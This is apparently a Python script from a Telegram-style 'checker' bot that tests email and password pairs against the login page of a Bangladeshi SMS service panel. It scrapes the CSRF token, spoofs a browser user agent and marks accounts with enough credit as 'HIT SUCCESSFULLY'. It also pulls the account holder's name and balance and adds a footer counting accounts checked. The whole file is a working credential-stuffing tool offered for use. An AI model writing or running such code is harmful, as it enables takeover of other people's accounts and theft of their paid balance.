import requests
import time
from bs4 import BeautifulSoup

def check_smsbd(email, password):
    # First request to get the login page and token
    session = requests.Session()
    login_page = session.get("https://panel.smsbangladesh.com/login")
    
    # Extract the CSRF token from the login page
    soup = BeautifulSoup(login_page.text, 'html.parser')
    token_input = soup.find('input', {'name': '_token'})
    
    if not token_input:
        return "Dead", "Failed to retrieve CSRF token."
    
    token = token_input.get('value', '')
    
    # Prepare the login data
    data = {
        '_token': token,
        'email': email,
        'password': password
    }
    
    # Headers to mimic a real browser
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Second request to post the login data
    login_response = session.post("https://panel.smsbangladesh.com/login", data=data, headers=headers)
    
    # Check if the login was successful
    if "These credentials do not match our records." in login_response.text:
        return "Dead", "Invalid Credentials🚫"
    
    # Parse the account details if login was successful
    soup = BeautifulSoup(login_response.text, 'html.parser')
    name = soup.find('span', {'class': 'logged-name hidden-md-down'}).text.strip() if soup.find('span', {'class': 'logged-name hidden-md-down'}) else "N/A"
    balance = soup.find('strong').text.strip() if soup.find('strong') else "N/A"

    if balance and float(balance) >= 1.50:
        response_message = (
            f"HIT SUCCESSFULLY✅\n"
            f"Name: {name}\n"
            f"Balance: {balance} BDT\n"
        )
        return "Hit", response_message
    else:
        return "Dead", f"Insufficient balance or unable to retrieve balance. Balance: {balance} BDT"

import time

def get_footer_info(total_accounts, start_time, username):
    # Correct elapsed time calculation
    elapsed_time = time.time() - start_time
    
    # Format elapsed time to a readable format
    elapsed_time_formatted = time.strftime('%H:%M:%S', time.gmtime(elapsed_time))
    
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"🔹 Total Accounts Checked - {total_accounts}\n"
        f"⏱️ Time Taken - {elapsed_time_formatted}\n"
        f"▫️ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB 👑\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer

